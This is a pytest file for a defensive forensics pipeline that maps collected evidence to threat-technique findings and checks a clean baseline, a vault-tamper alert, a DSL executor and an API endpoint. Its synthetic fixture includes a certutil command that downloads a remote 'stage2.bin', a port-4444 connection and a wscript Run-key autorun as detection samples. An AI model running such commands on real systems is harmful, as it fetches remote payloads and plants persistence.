"""
Tests for Phase 3: Evidence/Indicator Mapping.

Validates the full pipeline:
    Evidence → Observable Indicator → Technique → Forensic Finding

Verifies:
1. Extraction of concrete observable indicators from diverse collector evidence.
2. Binding to authoritative TechniqueEntry items from TechniqueRegistry.
3. Preservation of Evidence Vault IDs, event timestamps, case ID, execution ID, and device ID.
4. Clean baseline telemetry does not produce anomalous findings.
5. Integration into JOCKY DSL IR executor (ANALYZE command).
6. REST API endpoint /api/forensics/analyze/techniques.
7. Strict defensive read-only safety invariants.
"""

import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.analysis.mapping import (
    EvidenceTechniqueMapper,
    ForensicContext,
    ObservableIndicator,
    TechniqueFinding,
    analyze_evidence_techniques,
)
from backend.app.analysis.registry import TechniqueCategory
from backend.app.engine import execute_jocky_ir
from backend.app.language import compile_jocky

client = TestClient(app)


# ── Synthetic Forensic Fixtures ──────────────────────────────────────────────

@pytest.fixture
def synthetic_malicious_evidence():
    """Synthetic evidence containing multiple observable threat indicators."""
    return {
        "case_id": "CASE-SYNTH-001",
        "execution_id": "EXEC-SYNTH-88",
        "device_id": "DEV-TEST-001",
        "target": "WORKSTATION-CORP",
        "evidence_ids": {
            "processes": "EVID-SYNTH-PROC-001",
            "network": "EVID-SYNTH-NET-001",
            "windows_metadata": "EVID-SYNTH-WM-001",
            "files": "EVID-SYNTH-FILE-001",
        },
        "system": {
            "hostname": "WORKSTATION-CORP",
            "os": "Windows",
            "os_version": "11.0.22631",
            "architecture": "AMD64",
        },
        "processes": {
            "count": 4,
            "processes": [
                # Indicator 1: Temp directory execution (TECH-TMP-EXEC)
                {
                    "pid": 1100,
                    "ppid": 800,
                    "name": "dropper.exe",
                    "exe": r"C:\Users\Target\AppData\Local\Temp\dropper.exe",
                    "cmdline": [r"C:\Users\Target\AppData\Local\Temp\dropper.exe", "--silent"],
                    "create_time": "2026-09-27T10:15:30Z",
                    "username": "CORP\\TargetUser",
                },
                # Indicator 2: Office application spawning shell (TECH-PROC-SPAWN)
                {
                    "pid": 800,
                    "ppid": 700,
                    "name": "winword.exe",
                    "exe": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    "cmdline": ["WINWORD.EXE", "invoice.docm"],
                    "create_time": "2026-09-27T10:14:00Z",
                    "username": "CORP\\TargetUser",
                },
                {
                    "pid": 850,
                    "ppid": 800,
                    "name": "cmd.exe",
                    "exe": r"C:\Windows\System32\cmd.exe",
                    "cmdline": ["cmd.exe", "/c", "echo hello"],
                    "create_time": "2026-09-27T10:14:15Z",
                    "username": "CORP\\TargetUser",
                },
                # Indicator 3: LOLBin execution (TECH-LOLBINS)
                {
                    "pid": 1200,
                    "ppid": 850,
                    "name": "certutil.exe",
                    "exe": r"C:\Windows\System32\certutil.exe",
                    "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "http://198.51.100.23/stage2.bin"],
                    "create_time": "2026-09-27T10:15:45Z",
                    "username": "CORP\\TargetUser",
                },
                # Indicator 4: Unmapped binary (TECH-PROC-HOLLOW)
                {
                    "pid": 1300,
                    "ppid": 850,
                    "name": "svchost_ghost.exe",
                    "exe": None,
                    "cmdline": "",
                    "create_time": "2026-09-27T10:16:00Z",
                    "username": "CORP\\TargetUser",
                },
            ],
        },
        "network": {
            "count": 2,
            "connections": [
                # Indicator 5: Anomalous C2 port (TECH-NET-BACKDOOR)
                {
                    "pid": 1100,
                    "protocol": "TCP",
                    "status": "ESTABLISHED",
                    "laddr": {"ip": "10.0.0.15", "port": 49821},
                    "raddr": {"ip": "203.0.113.55", "port": 4444},
                    "timestamp": "2026-09-27T10:15:32Z",
                },
                # Normal connection
                {
                    "pid": 900,
                    "protocol": "TCP",
                    "status": "ESTABLISHED",
                    "laddr": {"ip": "10.0.0.15", "port": 49830},
                    "raddr": {"ip": "1.1.1.1", "port": 443},
                    "timestamp": "2026-09-27T10:15:35Z",
                },
            ],
        },
        "windows_metadata": {
            "autoruns": [
                # Indicator 6: Script autorun persistence (TECH-REG-AUTORUN)
                {
                    "hive": "HKCU_Run",
                    "path": r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    "name": "UpdaterService",
                    "command": r"wscript.exe C:\Users\Target\AppData\Roaming\update.vbs",
                    "type": "REG_SZ",
                    "timestamp": "2026-09-27T10:16:10Z",
                }
            ]
        },
        "files": {
            "files": [
                # Indicator 7: Timestomping zeroed subseconds (TECH-TIMESTOMP)
                {
                    "path": r"C:\Users\Target\AppData\Roaming\update.vbs",
                    "size_bytes": 1024,
                    "modified_time": "2026-09-27T10:00:00.000000Z",
                    "created_time": "2026-09-27T10:00:00.000000Z",
                    "sha256": "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
                }
            ]
        },
    }


@pytest.fixture
def synthetic_clean_evidence():
    """Synthetic evidence representing a clean baseline system."""
    return {
        "case_id": "CASE-CLEAN-001",
        "system": {
            "hostname": "CLEAN-PC",
            "os": "Windows",
            "os_version": "11.0.22631",
        },
        "processes": {
            "count": 2,
            "processes": [
                {
                    "pid": 400,
                    "ppid": 4,
                    "name": "services.exe",
                    "exe": r"C:\Windows\System32\services.exe",
                    "cmdline": [r"C:\Windows\system32\services.exe"],
                    "create_time": "2026-09-27T08:00:00Z",
                    "username": "NT AUTHORITY\\SYSTEM",
                },
                {
                    "pid": 600,
                    "ppid": 400,
                    "name": "svchost.exe",
                    "exe": r"C:\Windows\System32\svchost.exe",
                    "cmdline": [r"C:\Windows\system32\svchost.exe", "-k", "netsvcs"],
                    "create_time": "2026-09-27T08:00:05Z",
                    "username": "NT AUTHORITY\\SYSTEM",
                },
            ],
        },
        "network": {
            "count": 1,
            "connections": [
                {
                    "pid": 600,
                    "protocol": "TCP",
                    "status": "LISTEN",
                    "laddr": {"ip": "0.0.0.0", "port": 135},
                    "raddr": None,
                }
            ],
        },
    }


# ── Pipeline Mapping Tests ───────────────────────────────────────────────────

def test_evidence_to_indicator_extraction(synthetic_malicious_evidence):
    """Verify raw evidence yields expected ObservableIndicator instances with full provenance."""
    mapper = EvidenceTechniqueMapper()
    ctx = mapper._extract_context(synthetic_malicious_evidence)

    indicators = mapper.extract_indicators(synthetic_malicious_evidence, ctx)
    assert len(indicators) >= 6

    # Verify presence of specific indicator types
    ind_types = {ind.indicator_type for ind in indicators}
    assert "path_anomaly" in ind_types
    assert "ancestry_anomaly" in ind_types
    assert "command_anomaly" in ind_types
    assert "socket_anomaly" in ind_types
    assert "binary_anomaly" in ind_types
    assert "autorun_anomaly" in ind_types
    assert "integrity_anomaly" in ind_types

    # Verify that Evidence Vault IDs and timestamps are preserved on indicators
    proc_ind = next(ind for ind in indicators if ind.indicator_type == "path_anomaly")
    assert proc_ind.evidence_id == "EVID-SYNTH-PROC-001"
    assert proc_ind.collector_source == "processes"
    assert proc_ind.timestamp == "2026-09-27T10:15:30Z"
    assert proc_ind.entity_id == "ENT-PROC-1100"


def test_indicator_to_technique_finding_synthesis(synthetic_malicious_evidence):
    """Verify indicators map to TechniqueFinding records with accurate MITRE and category tags."""
    mapper = EvidenceTechniqueMapper()
    findings = mapper.analyze_evidence(synthetic_malicious_evidence)

    assert len(findings) >= 5
    tech_ids = {f.technique_id for f in findings}

    # Verify key techniques mapped
    assert "TECH-TMP-EXEC" in tech_ids
    assert "TECH-PROC-SPAWN" in tech_ids
    assert "TECH-LOLBINS" in tech_ids
    assert "TECH-NET-BACKDOOR" in tech_ids
    assert "TECH-PROC-HOLLOW" in tech_ids
    assert "TECH-REG-AUTORUN" in tech_ids

    # Deep verification of a specific finding (TECH-PROC-SPAWN)
    spawn_finding = next(f for f in findings if f.technique_id == "TECH-PROC-SPAWN")
    assert spawn_finding.category == TechniqueCategory.PROCESS_HIERARCHY_INJECTION
    assert spawn_finding.severity == "HIGH"
    assert spawn_finding.mitre_id == "T1059.001"
    assert spawn_finding.detection_rule_id == "RULE-002"
    assert "invoice.docm" in spawn_finding.detailed_description or len(spawn_finding.indicators) > 0
    assert spawn_finding.context.case_id == "CASE-SYNTH-001"
    assert spawn_finding.context.device_id == "DEV-TEST-001"
    assert spawn_finding.context.target_host == "WORKSTATION-CORP"


def test_clean_baseline_produces_no_anomalies(synthetic_clean_evidence):
    """Verify benign clean baseline telemetry produces 0 threat findings."""
    mapper = EvidenceTechniqueMapper()
    findings = mapper.analyze_evidence(synthetic_clean_evidence)
    assert len(findings) == 0


def test_evidence_vault_tamper_indicator():
    """Verify Evidence Vault compromised status creates a CRITICAL finding."""
    evidence = {
        "case_id": "CASE-VAULT-TAMPER",
        "vault_audit": {
            "vault_status": "COMPROMISED",
            "audited_at": "2026-09-27T12:00:00Z",
            "tampered_artifacts": [
                {
                    "evidence_id": "EVID-TAMPERED-001",
                    "source": "processes",
                    "stored_hash": "aaaa1111",
                    "recomputed_hash": "bbbb2222",
                }
            ],
        },
    }
    mapper = EvidenceTechniqueMapper()
    findings = mapper.analyze_evidence(evidence)

    assert len(findings) == 1
    tamper_finding = findings[0]
    assert tamper_finding.technique_id == "TECH-EVID-TAMPER"
    assert tamper_finding.severity == "CRITICAL"
    assert tamper_finding.indicators[0].evidence_id == "EVID-TAMPERED-001"


# ── IR Engine & REST API Integration Tests ────────────────────────────────────

def test_jocky_ir_executor_includes_technique_findings(synthetic_malicious_evidence):
    """Verify JOCKY IR execution of ANALYZE populates technique_findings in analysis_result."""
    script = """CASE "CASE-SYNTH-001"
TARGET "WORKSTATION-CORP"
COLLECT SYSTEM
COLLECT PROCESSES
COLLECT NETWORK
ANALYZE PROCESS_NETWORK
VERIFY INTEGRITY
REPORT FORMAT JSON"""

    compiled = compile_jocky(script)
    assert compiled["success"] is True

    # Mock provider returning the synthetic malicious data
    class MockMaliciousProvider:
        def collect_system(self): return synthetic_malicious_evidence["system"]
        def collect_processes(self, **kwargs): return synthetic_malicious_evidence["processes"]
        def collect_network(self, **kwargs): return synthetic_malicious_evidence["network"]
        def collect_files(self, **kwargs): return {"files": []}
        def collect_users(self): return {"users": []}
        def collect_windows_metadata(self): return synthetic_malicious_evidence["windows_metadata"]
        def collect_registry(self): return synthetic_malicious_evidence["windows_metadata"]

    receipt = execute_jocky_ir(compiled["ir"], collector_provider=MockMaliciousProvider())
    assert receipt["success"] is True

    analysis = receipt.get("analysis", {})
    assert analysis.get("status") == "COMPLETED"
    assert "technique_findings" in analysis

    tech_findings = analysis["technique_findings"]
    assert len(tech_findings) >= 3

    mapped_ids = {tf.get("technique_id") for tf in tech_findings}
    assert "TECH-TMP-EXEC" in mapped_ids
    assert "TECH-PROC-SPAWN" in mapped_ids


def test_api_analyze_techniques_endpoint(synthetic_malicious_evidence):
    """Verify POST /api/forensics/analyze/techniques evaluates payload and returns findings."""
    resp = client.post(
        "/api/forensics/analyze/techniques",
        json={
            "evidence": synthetic_malicious_evidence,
            "case_id": "CASE-API-TEST",
            "execution_id": "EXEC-API-TEST-99",
            "device_id": "DEV-ENDPOINT-77",
            "target_host": "REMOTE-LAPTOP",
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["success"] is True
    assert data["case_id"] == "CASE-API-TEST"
    assert data["device_id"] == "DEV-ENDPOINT-77"
    assert data["findings_count"] >= 5

    first_finding = data["findings"][0]
    assert "finding_id" in first_finding
    assert "technique_id" in first_finding
    assert "indicators" in first_finding
    assert "context" in first_finding
    assert first_finding["context"]["device_id"] == "DEV-ENDPOINT-77"
